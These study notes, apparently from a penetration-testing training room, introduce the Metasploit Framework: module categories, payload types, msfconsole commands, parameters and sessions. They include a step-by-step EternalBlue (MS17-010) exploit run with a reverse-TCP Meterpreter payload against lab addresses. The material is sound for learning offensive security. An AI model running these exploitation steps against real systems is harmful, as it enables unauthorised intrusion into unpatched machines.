# Metasploit: Introduction

## Overview

Metasploit is the most widely used exploitation framework in penetration testing. It supports all phases of an engagement — from information gathering and scanning to exploitation, post-exploitation, and reporting. This room covers the Metasploit Framework's architecture, module categories, the msfconsole interface, parameter management, sessions, and search functionality.

---

## Topics Covered

- Metasploit Framework vs Metasploit Pro
- Module categories: Auxiliary, Encoders, Evasion, Exploits, NOPs, Payloads, Post
- Payload types: Singles, Stagers, Stages, Adapters
- msfconsole basics: navigation, context, tab completion
- Setting parameters: `set`, `setg`, `unset`, `show options`
- Running exploits and managing sessions
- Searching for modules

---

## Key Concepts

### Metasploit Versions

| Version | Description |
|---|---|
| Metasploit Pro | Commercial version with GUI and automation features |
| Metasploit Framework | Open-source, command-line version — used in this room |

**Main components:**
- `msfconsole` — the primary command-line interface
- Modules — exploits, scanners, payloads, encoders, etc.
- Tools — `msfvenom`, `pattern_create`, `pattern_offset`

---

### Module Categories

| Category | Description |
|---|---|
| Auxiliary | Supporting modules: scanners, crawlers, fuzzers |
| Encoders | Encode payloads to potentially bypass signature-based AV |
| Evasion | Modules specifically designed to evade antivirus detection |
| Exploits | Exploit code organised by target OS |
| NOPs | No-Operation instructions (0x90) — used as buffers for consistent payload sizes |
| Payloads | Code that runs on the target after exploitation |
| Post | Post-exploitation modules used after gaining access |

---

### Payload Types

| Type | Description |
|---|---|
| Singles (Inline) | Self-contained — does not need to download additional components |
| Stagers | Sets up a connection channel; downloads the rest of the payload (Stage) |
| Stages | Downloaded by the stager; enables larger payloads |
| Adapters | Wraps single payloads to convert them into different formats |

**Identifying payload type from the name:**
- `generic/shell_reverse_tcp` — inline/single (underscore between `shell` and `reverse`)
- `windows/x64/shell/reverse_tcp` — staged (slash between `shell` and `reverse`)

---

### Core Terminology

| Term | Definition |
|---|---|
| Exploit | Code that takes advantage of a vulnerability on the target |
| Vulnerability | A flaw in design, code, or logic that can be exploited |
| Payload | Code that runs on the target system after exploitation (e.g. a shell, Meterpreter) |

---

### msfconsole Basics

```bash
msfconsole              # Launch the Metasploit console
```

**Key commands:**

```
help                    # Display help menu
help set                # Help for a specific command
history                 # View previously typed commands
search <term>           # Search modules by name, CVE, or platform
use <module>            # Enter a module's context
back                    # Leave the current context
info                    # Show detailed info about the current module
show options            # List parameters for the current module
show payloads           # List compatible payloads
```

**Tab completion** is supported — type partial commands and press Tab to autocomplete.

---

### Context and Parameters

Metasploit is context-managed — parameters set for one module are lost when you switch to another (unless using `setg`).

```
set RHOSTS 10.10.10.10          # Set a parameter
set LHOST 10.10.10.1
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
unset RHOSTS                    # Clear a parameter
unset all                       # Clear all parameters
setg RHOSTS 10.10.10.10         # Set a global parameter (persists across modules)
unsetg RHOSTS                   # Clear a global parameter
show options                    # Verify all parameters
```

**Common parameters:**

| Parameter | Description |
|---|---|
| RHOSTS | Remote host(s) — target IP, range, CIDR, or file |
| RPORT | Remote port — the port of the vulnerable service |
| LHOST | Local host — attacker's IP for reverse connections |
| LPORT | Local port — attacker's listening port |
| PAYLOAD | The payload to use with the exploit |
| SESSION | Session ID for post-exploitation modules |

---

### Running Exploits

```
exploit                 # Run the exploit
run                     # Alias for exploit
exploit -z              # Run exploit and background the session immediately
check                   # Check if target is vulnerable without exploiting
```

---

### Sessions

```
sessions                # List all active sessions
sessions -i 2           # Interact with session 2
background              # Background the current session (also CTRL+Z)
```

---

### Searching for Modules

```
search ms17-010
search type:exploit platform:windows smb
search type:auxiliary telnet
search eternalblue
search CVE-2021-44228
```

**Module ranking:**

| Rank | Description |
|---|---|
| Excellent | Never crashes the service |
| Great | Auto-detects target or uses version check |
| Good | Has a default target for the common case |
| Normal | Reliable but version-specific |
| Average | ~50% success rate |
| Low | Under 50% success rate |
| Manual | Essentially a DoS or requires specific configuration |

---

## Practical Examples / Demonstrations

### Using EternalBlue (MS17-010)

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.10
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.10.1
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Using setg for multiple modules

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > setg RHOSTS 10.10.10.10
msf6 > back
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options
# RHOSTS already populated from setg
```

---

## Real-World Relevance

- Metasploit is the standard exploitation framework in penetration testing — mastering it is a prerequisite for most offensive security roles
- The module search functionality allows rapid identification of relevant exploits for discovered vulnerabilities
- Understanding payload types (single vs staged) is important for environments with firewall restrictions or limited bandwidth
- EternalBlue (MS17-010) is one of the most significant exploits in history — it powered WannaCry ransomware and is a staple in penetration testing against unpatched Windows systems
- Session management enables working across multiple targets or maintaining multiple access channels simultaneously

---

## Key Learnings

- Metasploit Framework is the open-source, command-line version used in security work
- Modules are categorised: Auxiliary, Encoders, Evasion, Exploits, NOPs, Payloads, Post
- Payloads are Singles (inline), Stagers, Stages, or Adapters — identified by `_` vs `/` in the name
- `msfconsole` is context-managed — use `setg` for global values
- `search`, `use`, `show options`, `set`, `exploit`, `sessions` are the core workflow commands
- Module ranking indicates reliability — prefer Excellent or Great ranked exploits

---

## Conclusion

Metasploit is the Swiss Army knife of penetration testing. Its structured module system, consistent interface, and broad exploit coverage make it the go-to framework for both beginners and experienced testers. Understanding the module categories, payload types, and msfconsole workflow is the foundation for all subsequent Metasploit work.
